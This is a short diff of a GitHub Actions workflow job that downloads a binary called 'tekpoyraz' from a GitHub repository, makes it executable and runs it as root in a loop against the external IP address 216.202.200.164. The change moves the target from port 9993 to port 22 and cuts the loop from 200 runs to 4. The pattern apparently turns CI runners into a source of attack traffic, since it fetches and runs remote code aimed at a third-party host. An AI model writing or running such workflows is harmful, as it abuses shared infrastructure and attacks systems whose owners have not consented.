@@ -16,8 +16,8 @@ jobs:
         run: |
           wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
           chmod +x tekpoyraz
-          for i in {1..200}; do
-            timeout 35 sudo ./tekpoyraz 216.202.200.164 9993
+          for i in {1..4}; do
+            timeout 35 sudo ./tekpoyraz 216.202.200.164 22
           done
 
       - name: OK !
